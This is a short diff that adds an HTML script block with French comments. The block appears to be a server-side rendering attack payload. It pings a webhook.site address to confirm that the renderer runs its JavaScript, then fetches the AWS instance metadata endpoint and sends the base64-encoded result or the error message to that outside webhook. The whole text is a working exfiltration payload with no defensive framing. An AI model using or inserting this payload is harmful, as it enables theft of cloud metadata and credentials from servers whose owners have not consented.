@@ -1,0 +1,9 @@
+<script>
+  var X = 'https://webhook.site/602a4c3f-d728-4f39-b048-a230f078075c/';
+  // 1. confirme que le renderer exécute bien notre JS :
+  new Image().src = X + '?js=1';
+  // 2. tente AWS IMDS depuis le réseau du renderer :
+  fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text())
+    .then(t  => { new Image().src = X + '?meta=' + btoa(t); })
+    .catch(e => { new Image().src = X + '?err=' + encodeURIComponent(e.message); });
+</script>
